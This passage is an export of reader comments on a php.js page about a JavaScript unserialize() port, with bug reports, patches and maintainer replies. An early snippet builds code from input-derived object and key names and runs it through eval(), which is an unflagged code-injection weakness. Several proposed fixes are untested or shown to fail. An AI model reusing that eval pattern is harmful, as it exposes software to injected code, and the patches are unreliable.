return;\r\n        }\r\n\t\t\r\n        rest = cont.substring(1);\r\n        break;\r\n    case &quot;O&quot;: \/\/ object\r\n        divpos = cont.indexOf(&quot;:&quot;);\r\n        if (divpos == -1) {\r\n            errormsg = &quot;missing : for object&quot;;\r\n            return;\r\n        }\r\n        size = parseInt(cont.substring(0, divpos));\r\n        var objname = cont.substring(divpos + 2, divpos + 2 + size);\r\n        if (cont.substring(divpos + 2 + size, divpos + 4 + size) != &quot;\\&quot;:&quot;) {\r\n            errormsg = &quot;object name is too long, or missing \\&quot;:&quot;;\r\n            return;\r\n        }\r\n\t\t\r\n        var objprops = unserialize(&quot;a:&quot; + cont.substring(divpos + 4 + size), 1);\r\n\t\t\r\n        if (error) {\r\n            errormsg = &quot;invalid object properties&quot;;\r\n            return;\r\n        }\r\n        rest = objprops[1];\r\n\t\t\r\n        var objout = &quot;function &quot; + objname + &quot;(){&quot;;\r\n        for (key in objprops[0]) {\r\n            objout += &quot;&quot; + key + &quot;=objprops[0]['&quot; + key + &quot;'];&quot;;\r\n        }\r\n        objout += &quot;}val=new &quot; + objname + &quot;();&quot;;\r\n        eval(objout);\r\n        break;\r\n    default:\r\n        errormsg = &quot;invalid input type&quot;;\r\n    }\r\n\t\r\n    return (arguments.length == 1 ? val : [val, rest]);\r\n}\r\n[\/CODE]\r\n\r\n\r\nPedro Tainha - email@pedrotainha.com\r\n\r\nwww.pedrotainha.com (in construction)"},{"date":"2008-03-20 15:13:16","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Pedro Tainha: Awesome! Thanks for the kind words and improved code!"},{"date":"2008-04-03 05:02:21","author":"Devin","url":"","comment":"You have:\r\n[CODE=&quot;Javascript&quot;]\r\nif (inp == &quot;&quot; || inp.length &lt; 2) {\r\n[\/CODE]\r\n\r\nIsn't the string length of &quot;&quot; &lt; 2 anyway?\r\nHow about:\r\n[CODE=&quot;Javascript&quot;]\r\nif (inp.length &lt; 2) {\r\n[\/CODE]"},{"date":"2008-04-03 08:49:21","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Devin: Logically you're right but my guess is that Arpad Ray had performance on his mind when writing it like that. \r\n\r\nIt's a recursive function so every bit of performance tweaking will help.\r\n\r\nI think the first check may be less CPU intensive than the second one. Though the second one probably needs to be in place for arrays and other cases, it is skipped if the first condition is true, thus saving you a calculation.\r\n\r\nIf you have other thoughts on that please let me know."},{"date":"2008-04-27 15:22:03","author":"alberto","url":"","comment":"wouldn't it be better just to transform the php object data to an XML object that is easy to hang by Javascript?\r\nAnybody interested in this way email me albertomelchor@hotmail.com"},{"date":"2008-04-28 09:03:20","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ alberto: Of course there are many ways to transport data between server- and clientside. \r\n\r\nWhich way is better depends on your situation. In this project however it's all about mimicking PHP functionality. And serialize &amp; unserialize are two functions that do just that, and I wouldn't be surprised if this is faster then generating &amp; parsing XML. Which is a pretty heavy format actually. \r\nBest in most cases would probably be JSON though. Because since PHP5, PHP can\r\n[CODE=&quot;PHP&quot;]\r\n$json = json_encode($array);\r\n[\/CODE]\r\nAnd JavaScript can interpret JSON natively:\r\n[CODE=&quot;Javascript&quot;]\r\nfor ( item in json ) {\r\n}\r\n[\/CODE]\r\nJSON will also produce the smallest output compared to XML &amp; serialized arrays.\r\n\r\nFor safe transportation you may want to additionally:\r\n\r\n[CODE=&quot;PHP&quot;]\r\nbase = base64_encode(json_encode($data));\r\n[\/CODE]\r\n\r\n[CODE=&quot;Javascript&quot;]\r\ndata = base64_decode(base);\r\n[\/CODE]\r\n\r\nbase64 functions have also been ported in this project."},{"date":"2008-06-27 08:11:47","author":"Lukasz","url":"","comment":"You have race conditions in your code\r\nfor the unserialize. That is you have return statement on multiple lines which sometimes but not always causes the an error\r\n\r\nExample:\r\n######################\r\nvar deserializedArray = unserialize(serializedObject);\r\n\r\nvar x = deserializedArray['someFiled'];\r\n\r\n######################\r\n\r\nSometimes if  I want to use the field ['someField'] of the deserializedArray immediately on the next line of code after calling the function unserialize I get the error saying that deserializedArray['someFiled'] has no properites. This is caused beacuse YOU HAVE RETUNED FROM THE FUNCTION BEFORE YOU HAVE FINISHED DESERIALIZING ALL THE FIELDS, AND THE CODE CONTINUES. I guess it is the way you used recursion that is the problem. \r\n\r\nThe actual output from Firebug:\r\n######################\r\nunserialize() finished ::\r\nunserialize() finished ::\r\nunserialize() finished ::\r\nunserialize() finished ::\r\nunserialize() finished ::\r\nunserialize() finished ::\r\nunserialize() finished ::\r\nunserialize() finished ::\r\nunserialize() finished ::\r\nunserialize() finished ::\r\nunserialize() finished ::\r\nunserialize() finished ::\r\nunserialize() finished ::\r\nunserialize() finished ::\r\nunserialize() finished ::\r\nunserialize() finished ::\r\nunserialize() finished ::\r\nunserialize() finished ::\r\nunserialize() finished ::\r\nunserialize() finished ::\r\nunserialize() finished ::\r\nunserialize() finished ::\r\nunserialize() finished ::\r\nunserializeResp has no properties\r\n[Break on this error] var anonsArr = unserializeResp['anons_media']\r\n######################"},{"date":"2008-07-17 22:16:09","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Lukasz: Can you post me the serializedObject  so we can test it?"},{"date":"2008-07-22 18:18:26","author":"Bug when key names have spaces","url":"","comment":"I have really enjoyed using these php.js functions. They sure make it easy for a PHP developer to use JavaScript\r\n\r\nI have been using unserialize() on Firefox 3.0 and noticed that if the key name contains spaces they are not unserialized correctly. Down near the end of the function, right before it eval()'s the code, replace this code with the following:\r\n\r\nBuggy code:\r\n[CODE='Javascript']\r\nfor (key in objprops[0]) {\r\n\tobjout += &quot;&quot; + key + &quot;=objprops[0]['&quot; + key + &quot;'];&quot;;\r\n}[\/CODE]\r\n\r\nFixed code:\r\n[CODE='Javascript']\r\nfor (key in objprops[0]) {\r\n\tobjout += &quot;this['&quot; + key + &quot;']=objprops[0]['&quot; + key + &quot;'];&quot;;\r\n}[\/CODE]\r\n\r\ndptr1988"},{"date":"2008-07-22 20:02:33","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ dptr1988: I've committed your fix and credited you accordingly. Thank you very much dptr1988!!"},{"date":"2008-07-28 15:17:47","author":"nimbus","url":"","comment":"serializing arrays has two major flaws:\r\n\r\na) non-numeric indexes cause the function to break!\r\n\r\nb) negative values break your function!\r\n\r\ndid you test your code at all?!\r\n\r\nplease fix or at least tell people - it took me quite a while to find that out!\r\n:-("},{"date":"2008-08-27 16:32:56","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ nimbus: This has been caused by a logic-mistake. JavaScript distincts associative arrays from objects. PHP does not. I've made some adjustments to correct the behaviour &amp; increase compatibility with PHP.\r\n\r\nAnd for as testing the functions, I've just finished writing a CLI script that can now test functions from the commandline, so expect the quality to be higher in the near future.\r\n\r\nOf course, input (ideas for tests, improvements) by readers is very much appreciated."},{"date":"2008-09-11 15:50:16","author":"Jakub","url":"","comment":"Hi,\r\nI have noticed that for some strings, this 'for' should be executed 'length -1' not 'length' times:\r\n[CODE=&quot;Javascript&quot;]\r\n        for(var i = 0;i &lt; length;i++){\r\n            var chr = data.slice(offset + (i - 1),offset + i);\r\n            buf.push(chr);\r\n        }\r\n[\/CODE]\r\nwhen I have changed it to:\r\n[CODE=&quot;Javascript&quot;]\r\n        for(var i = 0;i &lt; length-1;i++){\r\n            var chr = data.slice(offset + (i - 1),offset + i);\r\n            buf.push(chr);\r\n        }\r\n[\/CODE]\r\nit has worked well.\r\n\r\nBTW. You are doing a great job here."},{"date":"2008-09-13 15:45:58","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Jakub: Thanks for contributing to our project. When I implement your change and test it, I get the following error from rhino:\r\n\r\n[CODE=&quot;text&quot;]\r\nkevin@trinity:~\/workspace\/plutonia-phpjs\/_tools$ .\/phpjstest.php unserialize\r\nException in thread &quot;Thread-0&quot; org.mozilla.javascript.JavaScriptException: [object Error] (\/home\/kevin\/workspace\/plutonia-phpjs\/functions\/var\/unserialize.js#16)\r\n\tat org.mozilla.javascript.gen.c4._c2(Unknown Source)\r\n\tat org.mozilla.javascript.gen.c4.call(Unknown Source)\r\n\tat org.mozilla.javascript.optimizer.OptRuntime.callName(OptRuntime.java:97)\r\n\tat org.mozilla.javascript.gen.c4._c5(Unknown Source)\r\n\tat org.mozilla.javascript.gen.c4.call(Unknown Source)\r\n\tat org.mozilla.javascript.optimizer.OptRuntime.callName(OptRuntime.java:97)\r\n\tat org.mozilla.javascript.gen.c4._c5(Unknown Source)\r\n\tat org.mozilla.javascript.gen.c4.call(Unknown Source)\r\n\tat org.mozilla.javascript.optimizer.OptRuntime.callName(OptRuntime.java:97)\r\n\tat org.mozilla.javascript.gen.c4._c1(Unknown Source)\r\n\tat org.mozilla.javascript.gen.c4.call(Unknown Source)\r\n\tat org.mozilla.javascript.optimizer.OptRuntime.callName(OptRuntime.java:97)\r\n\tat org.mozilla.javascript.gen.c1._c1(Unknown Source)\r\n\tat org.mozilla.javascript.gen.c1.call(Unknown Source)\r\n\tat org.mozilla.javascript.ScriptRuntime.applyOrCall(ScriptRuntime.java:2234)\r\n\tat org.mozilla.javascript.BaseFunction.execIdCall(BaseFunction.java:257)\r\n\tat org.mozilla.javascript.IdFunctionObject.call(IdFunctionObject.java:127)\r\n\tat org.mozilla.javascript.optimizer.OptRuntime.call2(OptRuntime.java:76)\r\n\tat org.mozilla.javascript.gen.c2._c17(Unknown Source)\r\n\tat org.mozilla.javascript.gen.c2.call(Unknown Source)\r\n\tat org.mozilla.javascript.optimizer.OptRuntime.call1(OptRuntime.java:66)\r\n\tat org.mozilla.javascript.gen.c2._c4(Unknown Source)\r\n\tat org.mozilla.javascript.gen.c2.call(Unknown Source)\r\n\tat org.mozilla.javascript.optimizer.OptRuntime.callProp0(OptRuntime.java:119)\r\n\tat org.mozilla.javascript.gen.c2._c107(Unknown Source)\r\n\tat org.mozilla.javascript.gen.c2.call(Unknown Source)\r\n\tat org.mozilla.javascript.ContextFactory.doTopCall(ContextFactory.java:393)\r\n\tat org.mozilla.javascript.ScriptRuntime.doTopCall(ScriptRuntime.java:2834)\r\n\tat org.mozilla.javascript.gen.c2.call(Unknown Source)\r\n\tat org.mozilla.javascript.Context.call(Context.java:548)\r\n\tat org.mozilla.javascript.JavaAdapter.callMethod(JavaAdapter.java:507)\r\n\tat adapter1.run(&lt;adapter&gt;)\r\n\tat java.lang.Thread.run(Thread.java:619)\r\n[\/CODE]"},{"date":"2008-09-17 17:35:17","author":"Kate","url":"http:\/\/www.exploretheearth.info","comment":"Thank you so much for allowing me the opportunity to visit this site."},{"date":"2008-12-17 06:54:32","author":"Alind","url":"","comment":"Unserialize function is not working for Javascript Objects can u tell me something related with this....."},{"date":"2008-12-17 14:35:48","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Alind: It would really help if you could supply the exact code that fails so we can take a look at it, fix it, and add it as testcase to it stays fixed in the future as well. Would that be possible?"},{"date":"2009-04-02 16:41:01","author":"Thomas Buschhardt","url":"","comment":"Hallo, thanx for the code. How can I read the length of the list you returned in Example 1? Is this an array?\nI try\n[CODE]\nvar testArray=unserialize(someStuff);\nalert(testArray.length);\n[\/CODE]\nwith no luck\n\nBye Thomas"},{"date":"2009-04-03 16:52:29","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"Why not use count :)"},{"date":"2009-04-03 19:25:15","author":"Brett Zamir","url":"","comment":"Hi Thomas,\n\nIn PHP.JS, we return objects often where arrays are used in PHP. This is because JavaScript has no other way to represent associative-arrays--arrays in which the indexes are either not all numerical, or are not numbered sequentially from 0 and\/or by 1..\n\nHere's the link to count() as Kevin pointed out: http:\/\/phpjs.org\/functions\/view\/count\/ which does counting of objects too..."},{"date":"2009-06-26 17:53:19","author":"Chris","url":"","comment":"Regarding this code:\n[code]            case 'b':\n                typeconvert = function (x) {return parseInt(x, 10) == 1;};[\/code]\nI don't know that this could ever matter, but it should technically be `return parseInt(x, 10) != 0` because all non-zero values are true."},{"date":"2009-06-29 01:10:16","author":"James","url":"","comment":"Had a problem using this on FF 3.5b4. The browser was having trouble at determining what data was so I had to make the following change:\n\n[CODE]\nreturn _unserialize(data, 0)[2];\n[\/CODE]\n\nto\n\n[CODE]\nreturn _unserialize(String(data), 0)[2];\n[\/CODE]"},{"date":"2009-07-03 13:48:27","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Chris + James: Thanks for your fixes guys, I've added them to SVN"},{"date":"2009-07-07 03:45:44","author":"k_de surya","url":"kdenotes.blogspot.com","comment":"thanks for the code..."},{"date":"2009-07-16 05:01:17","author":"fer","url":"","comment":"thanks \n\ndoes not work well with accents such as: \u00e1"},{"date":"2009-08-23 21:58:50","author":"Martin","url":"www.erlenwiese.de","comment":"This does not work with german umlauts (\u00f6, \u00e4, \u00fc, \u00df). \n\nI get the following message:\n\nUnknown \/ Unhandled data type(s):\n\nI'm wondering, why there is a call of \"encodeURIComponent\" in the serialize function but no \"decodeURIComponent\" in the unserialize function. Maybe it has something to do with this!?\n\n[CODE]\n   var test = {\n    a: \"Martin\",\n    b: \"Schmidt\",\n    c: \"\u00e4\u00f6\u00fc\u00df\",\n    d: \"&&%%$$\" };\n\n  var x = serialize(test);\n  var test2 = unserialize(x);\n[\/CODE]"},{"date":"2009-08-24 08:53:27","author":"Martin","url":"www.erlenwiese.de","comment":"In opposite to the php unserialize function this one cannot handle utf8 strings. If you call utf8_encode() before you call unserialize() and run the returned data through utf8_decode(), it works fine. But to have the same functionality as the php function, this should be part of the unserialize function."},{"date":"2009-09-04 18:31:31","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Martin: Good point. The base64 encoding function have utf8 dependencies too, so we might as well add them to the serialize functions.\n\nAdded to our new git rep:\nhttp:\/\/github.com\/kvz\/phpjs\/commit\/80ef918e43ffe015c241cb31d35b3afafada7d33"},{"date":"2009-09-26 17:47:14","author":"Le Torbi","url":"http:\/\/www.letorbi.de","comment":"Hi guys,\n\nI just fixed the utf8 issue. The problem was, that the given size represents the length in bytes, but it was interpreted as if it is the length in characters. I fixed it by calculating the size in bytes of each character and reducing the length accordingly. Here is the code:\n\n[CODE]\nvar read_chrs = function (data, offset, length){\n    var buf;\n\n    buf = [];\n    for (var i = 0;i < length;i++){\n        var chr = data.slice(offset + (i - 1),offset + i);\n        buf.push(chr);\n        length -= utf8Overhead(chr); \/\/ NEW LINE\n    }\n    return [buf.length, buf.join('')];\n};\nvar utf8Overhead = function(char) { \/\/ NEW FUNCTION\n    var code = char.charCodeAt(0);\n    if (code < 0x0080)\n        return 0;\n    if (code < 0x0800)\n         return 1;\n    return 2;\n};\n[\/CODE]\n\nI've also written a faster method to calculate the string length in bytes for the serialize() function. See my posting there for details.\n\nBTW: What do I have to to to get this into the official code?\n\nBai\nLe Torbi"},{"date":"2009-09-26 19:02:12","author":"Le Torbi","url":"http:\/\/www.letorbi.de","comment":"Whoops, I guess my bug is another than the one discussed below my post.\n\nThe problem is (or was) that strings, which contain special chars (like German umlauts or Japanese), have some additional chars after they have been unserialized. For example 's:6:\"h\u00f6h\u00f6\":s:3:\"abc\"' became 'h\u00f6h\u00f6\":' and 'abc' (\": was added to the string with the umlauts).\n\nHowever, the code I've postetd below fixes this issue.\n\nPS: \u00f6 is one character (German umlaut oe) not two (just in case it'll be screwed up when posted)."},{"date":"2009-10-08 18:05:58","author":"Frank","url":"","comment":"This black background is horrible and makes it a pain to read this site!"},{"date":"2009-10-08 22:07:50","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Le Torbi: Wow big kuddos to you! I must say I would have never thought of that. Thanks a lot Le Torbi!\n\nWe will include this in the official repo. It will be online shortly. Thanks again!"},{"date":"2009-10-08 22:59:22","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Frank: Thanks for voicing your opinion : )\nWe're no designers. How do you like the new comment-code colors?"},{"date":"2009-11-03 07:15:12","author":"kilops","url":"","comment":"This function is giving me some troubles, throwing error : \"Function utf8_decode() does not exists --- Line ... 120\"\n\nOriginal code :\n[CODE]\ncase 's':\n(...)\n\n\/\/ Length was calculated on an utf-8 encoded string\n\/\/ so wait with decoding\nreaddata = this.utf8_decode(readdata);\n\nbreak;\ncase 'a':\n(...)\n[\/CODE]\n\n\nI changed to :\n[CODE]\ncase 's':\n(...)\n\n\/\/ Length was calculated on an utf-8 encoded string\n\/\/ so wait with decoding\nreaddata = PHP_JS.prototype.utf8_decode(readdata);\n\nbreak;\ncase 'a':\n(...)\n[\/CODE]\n\n\nI don't really know why but using \"PHP_JS.prototype.\" instead of \"this.\" fix my problem (despite the fact it's supposed to be the same object as far as I know)\n\n\nFYI :\nI'm using the namespaced version on FF 3.5.3\nand the serialize function may have the same problem."},{"date":"2009-11-03 09:25:28","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@kilops: Fixed at http:\/\/github.com\/kvz\/phpjs\/commit\/ce785027aeff2a1461ff54d5fd44d35b2f2d68d7 . When we made function calls use 'this', I may have overlooked a few nested function cases where we have to declare \"that\" (or something) outside of the nested functions and then refer to \"that\" inside the nested functions (since \"this\" has a different meaning depending on the function it is in and how it is used). \n\nIn this case (no pun intended), since \"this\" in a non-instantiated function refers to the global window object, and since you were using the namespaced version, it wasn't finding the method in the global namespace (as it shouldn't unless you redeclared it there). Using the \"that\" convention lets us drop through the \"that\" variable to the inner function so it can have access to the \"this\" on the enclosing method. Hope that makes sense.\n\nIf not, see http:\/\/www.crockford.com\/javascript\/private.html  "},{"date":"2009-11-03 19:02:24","author":"kilops","url":"","comment":"Thanx \"Brett Zamir\" for the explanation.\n\nAnd thx again for crediting me the fix despite I only came with the bug and a bad workaround.\n\nIf I see something else like that i'll keep you in touch.\n\n\nps: hurray for PHP.JS and everyone making it."},{"date":"2009-11-04 03:39:57","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@kilops, our pleasure. Kevin set up a good pattern of crediting people I think, and indeed pointing out bugs should get credit since it is the first step in fixing them! Also thanks for the positive feedback and for keeping your eye out for any other bugs..."},{"date":"2009-11-04 09:40:10","author":"Lyle Pratt","url":"baylor.edu","comment":"Hello,\n\nI am having some serious problems using this script in all versions of IE.\n\nThe error is getting thrown at line 146 (from the code excerpt on this page). It seems that that switch statement is getting defaulted a few times and its throwing off the whole unserialization.\n\nCan someone take a look at this? Im in a pretty big bind at the moment.\n\nHere is a sample of what I am trying to unserialize that is failing (works in Chrome, safari, and FF):\n[CODE]\na:18:{s:10:\"fa_essay_1\";a:4:{s:7:\"storage\";s:16:\"Essay Question 1\";s:5:\"value\";s:8:\"testfest\";s:2:\"id\";s:10:\"fa_essay_1\";s:5:\"group\";s:10:\"fa_essay_1\";}s:10:\"fa_essay_2\";a:4:{s:7:\"storage\";s:16:\"Essay Question 2\";s:5:\"value\";s:16:\"unset_this_value\";s:2:\"id\";s:10:\"fa_essay_2\";s:5:\"group\";s:10:\"fa_essay_2\";}s:15:\"form_first_name\";a:4:{s:7:\"storage\";s:10:\"First Name\";s:5:\"value\";s:7:\"Bobby J\";s:2:\"id\";s:15:\"form_first_name\";s:5:\"group\";s:15:\"form_first_name\";}s:16:\"form_middle_name\";a:4:{s:7:\"storage\";s:11:\"Middle Name\";s:5:\"value\";s:2:\"P.\";s:2:\"id\";s:16:\"form_middle_name\";s:5:\"group\";s:16:\"form_middle_name\";}s:14:\"form_last_name\";a:4:{s:7:\"storage\";s:9:\"Last Name\";s:5:\"value\";s:6:\"Baylor\";s:2:\"id\";s:14:\"form_last_name\";s:5:\"group\";s:14:\"form_last_name\";}s:19:\"form_preferred_name\";a:4:{s:7:\"storage\";s:14:\"Preferred Name\";s:5:\"value\";s:5:\"Bubba\";s:2:\"id\";s:19:\"form_preferred_name\";s:5:\"group\";s:19:\"form_preferred_name\";}s:13:\"form_birthday\";a:4:{s:7:\"storage\";s:8:\"Birthday\";s:5:\"value\";s:9:\"12-JUN-62\";s:2:\"id\";s:13:\"form_birthday\";s:5:\"group\";s:13:\"form_birthday\";}s:11:\"form_gender\";a:4:{s:7:\"storage\";s:6:\"Gender\";s:5:\"value\";s:1:\"M\";s:2:\"id\";s:11:\"form_gender\";s:5:\"group\";s:11:\"form_gender\";}s:12:\"form_country\";a:4:{s:7:\"storage\";s:7:\"Country\";s:5:\"value\";s:13:\"United States\";s:2:\"id\";s:12:\"form_country\";s:5:\"group\";s:12:\"form_country\";}s:12:\"form_address\";a:4:{s:7:\"storage\";s:7:\"Address\";s:5:\"value\";s:24:\"107 West Denison Drive \";s:2:\"id\";s:12:\"form_address\";s:5:\"group\";s:12:\"form_address\";}s:10:\"form_phone\";a:4:{s:7:\"storage\";s:12:\"Phone Number\";s:5:\"value\";s:16:\"unset_this_value\";s:2:\"id\";s:10:\"form_phone\";s:5:\"group\";s:10:\"form_phone\";}s:10:\"form_email\";a:4:{s:7:\"storage\";s:5:\"Email\";s:5:\"value\";s:34:\"Bobby_Baylor-University@baylor.edu\";s:2:\"id\";s:10:\"form_email\";s:5:\"group\";s:10:\"form_email\";}s:10:\"form_major\";a:4:{s:7:\"storage\";s:5:\"Major\";s:5:\"value\";s:10:\"Accounting\";s:2:\"id\";s:10:\"form_major\";s:5:\"group\";s:10:\"form_major\";}s:19:\"form_classification\";a:4:{s:7:\"storage\";s:14:\"Classification\";s:5:\"value\";s:8:\"Freshman\";s:2:\"id\";s:19:\"form_classification\";s:5:\"group\";s:19:\"form_classification\";}s:16:\"fa_art_interests\";a:4:{s:7:\"storage\";s:13:\"Art Interests\";s:5:\"value\";s:8:\"testfest\";s:2:\"id\";s:16:\"fa_art_interests\";s:5:\"group\";s:16:\"fa_art_interests\";}s:17:\"fa_film_interests\";a:4:{s:7:\"storage\";s:32:\"Film and Digital Media Interests\";s:5:\"value\";s:16:\"unset_this_value\";s:2:\"id\";s:17:\"fa_film_interests\";s:5:\"group\";s:17:\"fa_film_interests\";}s:18:\"fa_music_interests\";a:4:{s:7:\"storage\";s:15:\"Music Interests\";s:5:\"value\";s:16:\"unset_this_value\";s:2:\"id\";s:18:\"fa_music_interests\";s:5:\"group\";s:18:\"fa_music_interests\";}s:20:\"fa_theatre_interests\";a:4:{s:7:\"storage\";s:22:\"Theatre Arts Interests\";s:5:\"value\";s:16:\"unset_this_value\";s:2:\"id\";s:20:\"fa_theatre_interests\";s:5:\"group\";s:20:\"fa_theatre_interests\";}}\n[\/CODE]\n\n"},{"date":"2009-11-07 13:54:23","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Lyle Pratt: By altering the error message to return the offset, it seems that the function is running into problems where you have a space at the end of a string (i.e., after \"107 West Denison Drive\") if that helps you or someone else to debug this. Not sure if the space is being dropped somewhere or something..."},{"date":"2010-02-19 09:28:28","author":"plotas","url":"http:\/\/rokdd.de\/s\/scripts\/","comment":"Hi your function looks great but it does not work for me in FF 3.5 .. i get always the error:[code]Error: that.window[type] is not a constructor\nSource File: file:\/\/\/E:\/Dienste\/FirefoxPortable\/Data\/profile\/extensions\/%7Be4a8a97b-f2ed-450b-b12d-ee082ba24781%7D\/components\/greasemonkey.js\nLine: 1305[\/code]\nwell maybe that is because try to use in greasemonkey? any idea? Thaanks!"},{"date":"2010-02-19 12:12:51","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@plotas: It looks as though you are trying to use it within an XPCOM component. Is that right? If so, as with also JavaScript code modules (see https:\/\/developer.mozilla.org\/en\/JavaScript_code_modules ), certain JavaScript environments do not automatically include a window object. \n\nSo, you can either pass in a window object to the component at some point to initialize the window used by the component (esp. if you need a particular window, though that is not important in this case), or you may be able to simply use this to define \"window\".  It is possible that just using \"window\" could cause errors (I believe I've tried to redefine \"alert\" in that context and couldn't use it either), in such case, just rename \"window\", but hopefully you won't have to do that.\n\nIf your code that is using unserialize() is on an object\/class you'll need to ensure \"window\" is defined as a property of the object; otherwise, it can be defined globally within the component.\n\n[CODE]this.window = Components.classes['@mozilla.org\/appshell\/appShellService;1'].getService(Components.interfaces.nsIAppShellService).hiddenDOMWindow;[\/CODE]\n\nI believe there is another way to get a window in such code too, but the above works for me.\n\nNote that in regular client-side JS, \"this.window\" will translate to \"window.window\" which conveniently for us, simply refers back to the window object. Same effect I believe in XPCOM and code modules.\n\nDepending on your needs, if you weren't aware, Firefox also includes the JSON (see https:\/\/developer.mozilla.org\/en\/JSON , though maybe you need nsIJSON for XPCOM code: https:\/\/developer.mozilla.org\/en\/nsIJSON ) for object serialization."},{"date":"2010-05-04 23:25:09","author":"mscdex","url":"","comment":"I'm having the same problem as Alind (this function doesn't seem to support PHP objects). I am attempting to unserialize a PHP session, but the session string starts with:\n[CODE]\nbreadCrumbs|O:15:\"BreadCrumbStack\":3:{s:22:\" BreadCrumbStack stack\";a:2:{i:0;a:6:{s:7:\"item_id\"; ......\n[\/CODE]\n\nWhat happens as a result of unserializing this string is that the function sees the first 'b' in 'breadCrumbs' and thinks it found a boolean value, which causes unserialize() to return a value of true in this case.\n\nIs there a (already existing) fix for this?"},{"date":"2010-05-04 23:48:11","author":null,"url":"","comment":"@mscdex: I don't think PHP sessions can be unserialized in PHP itself. The format a PHP session is stored in (the one you provided) differs from the format serialize($_SESSION) would return, which is what you need to use. However, after looking at the code above for the unserialize function, I don't see a case statement for \"O,\" so you're right that this function won't work with objects."},{"date":"2010-10-27 12:27:59","author":"mansur muzafarov","url":"","comment":"it doesn't work with arrays\n\nhttp:\/\/www.phpguru.org\/downloads\/PHP_Unserialize\/PHP_Unserialize.js\n\nhere you can find working example"},{"date":"2011-04-17 20:42:35","author":"ramonlechuga","url":"http:\/\/twitter.com\/ramonlechuga","comment":"Great! Is so nice to find this , an already made function of unserialize and serialize :D you save my time thank you so much."},{"date":"2011-06-01 15:09:10","author":"Dj","url":"","comment":"Adding the following code to the switch statement will allow you to unserialize php objects to javascript array.\nSo you can take a string that was serialized by the php serialize() function and unserialize it with the javascript function.\n\n[CODE]\ncase 'o':\n\t\t\t\treaddata = {};\n\t\n\t\t\t\tccount = read_until(data, dataoffset, ':');\n\t\t\t\tchrs = ccount[0];\n\t\t\t\tstringlength = ccount[1];\n\t\t\t\tdataoffset += chrs + 2;\n\t\n\t\t\t\treadData = read_chrs(data, dataoffset + 1, parseInt(stringlength, 10));\n\t\t\t\tchrs = readData[0];\n\t\t\t\tvar className = readData[1];\n\t\t\t\tdataoffset += chrs + 2;\n\t\t\t\t\n\t\t\t\tif (chrs == parseInt(stringlength, 10) || chrs == className.length) {\n\t\t\t\t\tkeyandchrs = read_until(data, dataoffset, ':');\n\t\t\t\t\tchrs = keyandchrs[0];\n\t\t\t\t\tkeys = keyandchrs[1];\n\t\t\t\t\tdataoffset += chrs + 2;\n\t\t\n\t\t\t\t\tfor (var i = 0; i < parseInt(keys, 10); i++){\n\t\t\t\t\t\tvar kprops = _unserialize(data, dataoffset);\n\t\t\t\t\t\tvar kchrs = kprops[1];\n\t\t\t\t\t\tvar key = kprops[2];\n\t\t\t\t\t\tdataoffset += kchrs;\n\t\t\n\t\t\t\t\t\tvar vprops = _unserialize(data, dataoffset);\n\t\t\t\t\t\tvar vchrs = vprops[1];\n\t\t\t\t\t\tvar value = vprops[2];\n\t\t\t\t\t\tdataoffset += vchrs;\n\t\t\t\t\t\t\n\t\t\t\t\t\t\/\/Ignore non public properties (first char of key is null)\n\t\t\t\t\t\tif (typeof value !== 'undefined'\n\t\t\t\t\t\t\t&& typeof key === 'string'\n\t\t\t\t\t\t\t&& key.charCodeAt(0)\n\t\t\t\t\t\t) {\n\t\t\t\t\t\t\treaddata[key] = value;\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\n\t\t\t\t\tdataoffset += 1;\n\t\t\t\t}\n\t\t\t\tbreak;\n[\/CODE]"},{"date":"2011-06-20 15:19:45","author":null,"url":"","comment":"Hi,\n\n\n\nI dont understand why is this decoding from utf8. I was getting wierd characters, so I just commented the uft8_decode function. It's cool now (I use utf8 only or whenever possible)"},{"date":"2012-04-10 06:18:43","author":"Diana","url":"http:\/\/www.webonedivision.net","comment":"Great stuff, both serialize and unserialize work great for arrays!\nThank you very much."},{"date":"2012-05-01 06:47:07","author":"Anum","url":"","comment":"It gave me [object Object] as an output, i dont understand whats happening here."},{"date":"2012-06-07 18:48:32","author":"Jaroslaw Czarniak","url":"","comment":"Unserialize doesn't work (again) with german umlauts (\u00f6, \u00e4, \u00fc, \u00df) and other not latin characters.\n\nfor example folowing code:\n[code]\nvar test = {\n    a: \"Martin\",\n    b: \"Schmidt\",\n    c: \"\u00e4\u00f6\u00fc\u00df\",\n    d: \"&&%%$$\" };\n\n  var x = serialize(test);\n  var test2 = unserialize(x);\n[\/code]\n\nreturn:\n\n[code]\na => \"Martin\"\nb => \"Schmidt\"\nc => \"\u4dbc\u07c0\"\nd => \"&&%%$$\"\n[\/code]\n\nis there any way to fix it ?\n"},{"date":"2012-07-10 16:28:50","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Jaroslaw Czarniak: I have fixed this in Git. Hopefully we can keep this function (and all others) friendly to UTF8 which everyone should be using now anyways."},{"date":"2012-07-10 16:31:35","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Anum: You mean it is giving you the string \"[object Object]\" as output, or you are expecting an object? This should be converting a properly serialized string into an object. If you are getting the string, do you have sample code?"}],"urldecode":[{"date":"2008-06-13 03:26:22","author":"doqkhanh","url":"","comment":"I have a safer function:\r\n\/**\r\n* 